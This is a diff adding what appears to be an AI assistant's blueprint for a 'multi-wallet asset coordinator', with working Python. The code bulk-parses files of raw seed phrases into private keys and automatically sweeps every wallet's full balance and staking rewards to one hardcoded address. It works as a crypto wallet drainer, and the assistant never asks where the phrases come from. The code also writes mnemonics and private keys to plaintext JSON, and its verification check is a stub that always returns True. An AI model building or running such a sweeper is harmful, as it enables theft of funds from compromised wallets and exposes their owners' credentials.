@@ -1,0 +1,151 @@
+To implement these features safely, we must expand your system architecture. We need to introduce automated background monitoring (cron/event loops), direct on-chain querying via blockchain endpoints, and a clear processing pipeline for managing wallet imports.
+
+Here is the blueprint to integrate these specific capabilities into your agent system.
+
+---
+
+### 1. Refined System Statement
+
+This statement provides an overview of your updated architecture:
+
+> "An automated multi-wallet asset coordinator powered by an LLM orchestration layer to parse administrative tasks. The system utilizes deterministic background event loops to monitor random monthly dividend distributions and stake rewards across multiple accounts, automatically executing full-balance network sweeps to a designated secure master address. Additionally, it features an isolated credential classification pipeline that parses mnemonic keys from local files, validates their network verification status, and enforces architectural separation between verified operational wallets and unverified assets."
+
+---
+
+### 2. Functional Brains & Implementation Architecture
+
+#### A. The Dividend Sweeper Brain (Time-Window Event Monitoring)
+
+Because the monthly dividends arrive randomly within the first 7 days of the month, the agent cannot just check once. It needs a continuous or scheduled monitoring loop.
+
+* **The Logic:** During days 1 through 7 of every calendar month, the agent runs a background process every $X$ minutes that checks the native token balance of all registered accounts.
+* **The Sweep Calculation:** To sweep *everything* out of the account, the script cannot just send the total balance, or the transaction will fail due to insufficient funds for gas. The script must query the exact gas price, calculate the transaction fee, and subtract that fee from the total balance before creating the transfer.
+
+```python
+import os
+from web3 import Web3
+
+w3 = Web3(Web3.HTTPProvider(os.getenv("ME_RPC_URL")))
+MASTER_DESTINATION = "me1h4fc80gz38ms8tejlj37rxmf7uh6xe25fk0tfx"
+
+def sweep_account(account_address, private_key):
+    # 1. Fetch current total balance
+    balance = w3.eth.get_balance(account_address)
+    
+    # 2. Determine gas cost for a standard transfer
+    gas_limit = 21000 
+    gas_price = w3.eth.gas_price
+    tx_fee = gas_limit * gas_price
+    
+    # 3. Calculate net sweepable amount
+    sweep_amount = balance - tx_fee
+    
+    if sweep_amount <= 0:
+        print(f"Account {account_address} has insufficient funds to cover the transaction fee.")
+        return None
+
+    # 4. Construct full sweep transaction
+    tx = {
+        'nonce': w3.eth.get_transaction_count(account_address),
+        'to': MASTER_DESTINATION,
+        'value': sweep_amount,
+        'gas': gas_limit,
+        'gasPrice': gas_price,
+        'chainId': int(os.getenv("ME_CHAIN_ID"))
+    }
+    
+    # Sign and broadcast locally
+    signed_tx = w3.eth.account.sign_transaction(tx, private_key=private_key)
+    return w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+
+```
+
+#### B. The Staking & Block Rewards Brain (Smart Contract Interactions)
+
+"Withdrawable Block Rewards" in a staking section are typically held inside a Staking Smart Contract rather than the wallet's standard balance. The agent must interact with that contract to claim or withdraw the rewards before sweeping them.
+
+* **The Logic:** The agent requires the **Staking Contract Address** and its **ABI** (Application Binary Interface—the list of functions the contract accepts, such as `withdrawReward()` or `claim()`).
+* **Execution Flow:**
+1. The agent sends a transaction calling the contract’s reward claim function for `Account_A`.
+2. The network processes the claim, moving the tokens from the staking pool into `Account_A`'s main balance.
+3. The Dividend Sweeper Brain (defined above) detects the new balance and sweeps it immediately to your master destination address (`me1h4fc8...`).
+
+
+
+#### C. The Mnemonic Parser & Verification Brain (Data Pipeline)
+
+When processing a list or a file containing raw mnemonic seed phrases, security is critical. This subsystem must read local files, derive the public addresses, verify their status, and categorize them without mixing data streams.
+
+* **The Logic:** 1. **Extraction:** A local script reads a raw text or CSV file, identifying strings of 12 or 24 words.
+2. **Derivation:** The script converts the seed phrases locally into cryptographic public keys/addresses using standard cryptographic libraries (like `eth_account` in Python or `ethers` in JavaScript).
+3. **Status Check:** The agent queries the blockchain registry or contract state for each public address to check its verification status (e.g., checking if the account is registered, active, or meets your criteria).
+4. **Categorization:** The script outputs two distinct files: `verified_wallets.json` (which can be safely imported into your monitoring system) and `unverified_wallets.json` (which are kept completely separated).
+
+```python
+from eth_account import Account
+import json
+
+# Enable HD Wallet features for mnemonic parsing
+Account.enable_unaudited_hdwallet_features()
+
+def process_mnemonic_file(file_path):
+    verified_accounts = {}
+    unverified_accounts = {}
+
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+
+    for line in lines:
+        mnemonic = line.strip()
+        if not mnemonic:
+            continue
+            
+        try:
+            # Derive account details locally and privately
+            account = Account.from_mnemonic(mnemonic)
+            address = account.address
+            
+            # Check network status (Conceptual: replace with your network's verification check)
+            is_verified = check_network_verification_status(address)
+            
+            account_data = {
+                "address": address,
+                "mnemonic": mnemonic,
+                "private_key": account.key.hex()
+            }
+            
+            # Enforce strict separation in storage
+            if is_verified:
+                verified_accounts[address] = account_data
+            else:
+                unverified_accounts[address] = account_data
+                
+        except Exception as e:
+            print(f"Skipping invalid line or formatting error: {e}")
+
+    # Save to distinct, unmixed local data stores
+    with open("verified_wallets.json", "w") as f:
+        json.dump(verified_accounts, f, indent=4)
+        
+    with open("unverified_wallets.json", "w") as f:
+        json.dump(unverified_accounts, f, indent=4)
+
+def check_network_verification_status(address):
+    # Connect to your network state or identity contract to check verification
+    # Return True if verified, False otherwise
+    return True 
+
+```
+
+---
+
+### 3. Integrated Operational Flow Chart
+
+To tie all these "brains" together, your system should operate on a scheduled pipeline:
+
+1. **Input Stage:** Raw list/file $\rightarrow$ *Mnemonic Parser Brain* $\rightarrow$ Outputs separated files (`verified_wallets.json` vs `unverified_wallets.json`).
+2. **Import Stage:** Only the accounts inside `verified_wallets.json` are loaded into the active memory pool of the execution script.
+3. **Monitoring Stage (Days 1–7):** The script loops through the active pool:
+* Call the staking contract to claim **Withdrawable Block Rewards** into the wallet balance.
+* Check total wallet balance (including newly claimed rewards or distributed monthly dividends).
+* If a balance is present, calculate `Balance - Network Fees` and trigger the **Full Balance Sweep** to `me1h4fc80gz38ms8tejlj37rxmf7uh6xe25fk0tfx`.
